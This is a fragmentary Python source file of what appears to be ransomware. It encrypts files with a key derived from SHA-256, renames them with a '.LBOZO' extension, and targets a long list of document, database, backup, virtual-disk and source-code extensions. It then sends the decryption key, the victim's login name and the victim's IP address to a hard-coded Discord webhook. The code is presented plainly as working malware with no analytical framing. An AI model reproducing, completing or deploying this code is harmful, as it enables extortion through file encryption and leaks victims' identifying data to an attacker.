...
def encryptFile(filePath, password):
    try:
        ...
        hkey = hashObj.digest()
        encryptPath = Path(filePath.parent.resolve().as_posix() + "/" + vencrypt(filePath.name, password) + ".LBOZO")
...
def decryptFile(filePath, password):
    ...
    try:
        hashObj = SHA256.new(password.encode('utf-8'))
        hkey = hashObj.digest()
        decryptFilePath = Path(filePath.parent.resolve().as_posix() + "/" + vdecrypt(filePath.name, password)[:-6])
...
fileExtensions = ['DOC', 'DOCX', 'XLS', 'XLSX', 'PPT', 'PPTX', 'PST', 'OST', 'MSG', 'EML', 'VSD', 'VSDX', 'TXT', 'CSV', 'RTF', 'WKS', 'WK1', 'PDF', 'DWG', 'ONETOC2', 'SNT', 'JPEG', 'JPG', 'DOCB', 'DOCM', 'DOT', 'DOTM', 'DOTX', 'XLSM', 'XLSB', 'XLW', 'XLT', 'XLM', 'XLC', 'XLTX', 'XLTM', 'PPTM', 'POT', 'PPS', 'PPSM', 'PPSX', 'PPAM', 'POTX', 'POTM', 'EDB', 'HWP', '602', 'SXI', 'STI', 'SLDX', 'SLDM', 'VDI', 'VMDK', 'VMX', 'GPG', 'AES', 'ARC', 'PAQ', 'BZ2', 'TBK', 'BAK', 'TAR', 'TGZ', 'GZ', '7Z', 'RAR', 'ZIP', 'BACKUP', 'ISO', 'VCD', 'BMP', 'PNG', 'GIF', 'RAW', 'CGM', 'TIF', 'TIFF', 'NEF', 'PSD', 'AI', 'SVG', 'DJVU', 'M4U', 'M3U','MID', 'WMA', 'FLV', '3G2', 'MKV', '3GP', 'MP4', 'MOV', 'AVI', 'ASF', 'MPEG', 'VOB', 'MPG', 'WMV', 'FLA', 'SWF', 'WAV', 'MP3', 'SH', 'CLASS', 'JAR', 'JAVA', 'RB', 'ASP', 'PHP', 'JSP', 'BRD', 'SCH', 'DCH', 'DIP', 'PL', 'VB', 'VBS', 'PS1', 'BAT', 'CMD', 'JS', 'ASM', 'H', 'PAS', 'CPP', 'C', 'CS', 'SUO', 'SLN', 'LDF', 'MDF', 'IBD', 'MYI', 'MYD', 'FRM', 'ODB', 'DBF', 'DB', 'MDB', 'ACCDB', 'SQL', 'SQLITEDB', 'SQLITE3', 'ASC', 'LAY6', 'LAY', 'MML', 'SXM', 'OTG', 'ODG', 'UOP', 'STD', 'SXD', 'OTP', 'ODP', 'WB2', 'SLK', 'DIF', 'STC', 'SXC', 'OTS', 'ODS', '3DM', 'MAX', '3DS', 'UOT', 'STW', 'SXW', 'OTT', 'ODT', 'P12', 'CSR', 'CRT','PFX', 'DER', 'EXE']
...
if os.path.exists(f'{keypath}finished.done'):
    ...
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/990727870055845959/BQM38M7KSMnMNEA3yuJ1PvlkFjdfMgU4Eaij-Pf8AeRABPmgwGS_9JGtKSHcY7_XOPMm', content=f'Decryption Key Generated\n`{password}`\nThis key belongs to:\n`{os.getlogin()}, {socket.gethostbyname(hostname)}`\nThis key is valid for the following files:\n`{fileExtensions}`')
    webhook.execute()
    for x in paths:
        path = x
